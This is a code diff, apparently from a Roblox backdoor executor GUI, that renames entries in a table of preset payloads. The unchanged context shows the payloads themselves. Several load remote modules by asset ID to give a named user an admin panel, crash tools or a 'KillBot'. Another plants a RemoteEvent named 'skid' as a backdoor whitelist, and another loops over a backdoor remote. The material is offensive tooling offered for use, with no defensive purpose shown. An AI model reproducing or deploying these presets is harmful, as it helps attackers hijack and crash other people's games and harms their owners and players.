@@ -2885,9 +2885,9 @@ G2L_MODULES[G2L["90"]] = {
         local script = G2L["90"]
 
         return {
-            { name = "happyhub.txt", code = "require(78790302691160):Hload('%username%')" },
+            { name = "happyhub .txt", code = "require(78790302691160):Hload('%username%')" },
 
-            { name = "backdoor whitelist.txt", code = [[
+            { name = "backdoor whitelist .txt", code = [[
 local function createRemote()
     local remote = Instance.new("RemoteEvent", game.ReplicatedStorage)
     remote.Name = "skid"
@@ -2911,7 +2911,7 @@ end
 createRemote()
 ]] },
 
-			{ name = "delete backdoor.txt", code = [[
+			{ name = "delete backdoor .txt", code = [[
 while true do
     pcall(function()
         local remote = game.%backdoor%
@@ -2925,7 +2925,7 @@ while true do
 end
 ]] },
 
-            { name = "admin panel.txt", code = "require(12159842278).ADMIN('%username%')" },
+            { name = "admin panel .txt", code = "require(12159842278).ADMIN('%username%')" },
             { name = "CrashUI",         code = "require(6053693667).Crashexe('%username%')" },
             { name = "R6",              code = "require(4585652241).load('%username%')" },
             { name = "KillBot",         code = "require(3904000898).load('%username%')" },
